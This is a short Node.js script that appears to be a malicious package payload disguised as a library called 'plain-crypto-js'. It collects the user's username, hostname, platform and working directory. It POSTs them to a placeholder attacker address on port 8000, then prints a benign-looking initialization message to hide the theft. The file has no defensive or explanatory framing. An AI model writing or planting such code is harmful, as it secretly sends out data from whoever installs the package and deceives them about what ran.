const http = require("http");
const os = require("os");

const data = JSON.stringify({
  user: os.userInfo().username,
  host: os.hostname(),
  platform: process.platform,
  cwd: process.cwd()
});

const req = http.request(
  "http://ATTACKER's_IP:8000/collect",
  {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": data.length
    }
  }
);

req.write(data);
req.end();

console.log("[plain-crypto-js] initialized");
